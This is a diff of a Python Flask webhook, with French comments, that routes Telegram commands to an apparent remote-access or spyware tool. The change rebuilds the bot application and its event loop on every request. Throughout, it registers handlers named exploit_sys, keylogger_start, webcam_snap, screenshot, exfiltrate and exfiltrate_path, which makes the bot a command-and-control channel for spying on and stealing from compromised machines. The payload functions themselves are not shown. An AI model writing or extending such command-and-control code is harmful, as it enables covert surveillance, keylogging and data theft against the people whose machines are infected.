@@ -1,5 +1,6 @@
 import os
 import traceback
+import asyncio
 from flask import Blueprint, request, Response
 from telegram import Update
 from telegram.ext import (
@@ -9,7 +10,7 @@ from telegram.ext import (
 # ✅ Import clés depuis utils
 from modules.utils import get_api_keys
 
-# ✅ Commandes
+# ✅ Commandes Telegram
 from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
@@ -22,41 +23,42 @@ api = get_api_keys()
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
-# ✅ Création de l'application Telegram
-application = ApplicationBuilder().token(TOKEN).build()
-
-# ✅ Ajout des handlers une seule fois
-application.add_handler(CommandHandler("menu", menu))
-application.add_handler(CommandHandler("osint", osint))
-application.add_handler(CommandHandler("scan", scan))
-application.add_handler(CommandHandler("exploit_sys", exploit_sys))
-application.add_handler(CommandHandler("screenshot", screenshot))
-application.add_handler(CommandHandler("keylogger_start", keylogger_start))
-application.add_handler(CommandHandler("webcam_snap", webcam_snap))
-application.add_handler(CommandHandler("exfiltrate", exfiltrate))
-application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
-application.add_handler(CommandHandler("rapport", rapport))
-
 # ✅ Blueprint Flask
 telegram_webhook = Blueprint("telegram_webhook", __name__)
 
-# ✅ Initialisation manuelle protégée
-app_initialized = False
-
 @telegram_webhook.route("/webhook", methods=["POST"])
-async def handle_webhook():
-    global app_initialized
+def handle_webhook():
     try:
         if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
             return Response("Unauthorized", status=403)
 
-        # ✅ Initialisation (une seule fois)
-        if not app_initialized:
-            await application.initialize()
-            app_initialized = True
+        update_data = request.get_json(force=True)
+        update = Update.de_json(update_data, bot=None)
 
-        update = Update.de_json(request.get_json(force=True), application.bot)
-        await application.process_update(update)
+        # 🔁 Nouvelle instance isolée à chaque appel (anti-loop-close bug)
+        app = ApplicationBuilder().token(TOKEN).build()
+
+        # ➕ Ajout des handlers
+        app.add_handler(CommandHandler("menu", menu))
+        app.add_handler(CommandHandler("osint", osint))
+        app.add_handler(CommandHandler("scan", scan))
+        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
+        app.add_handler(CommandHandler("screenshot", screenshot))
+        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
+        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
+        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
+        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
+        app.add_handler(CommandHandler("rapport", rapport))
+
+        # 🧠 Gestion propre de l’event loop
+        async def process():
+            await app.initialize()
+            await app.process_update(update)
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(process())
+        loop.close()
 
         print("✅ Webhook Telegram traité avec succès.")
         return Response("OK", status=200)
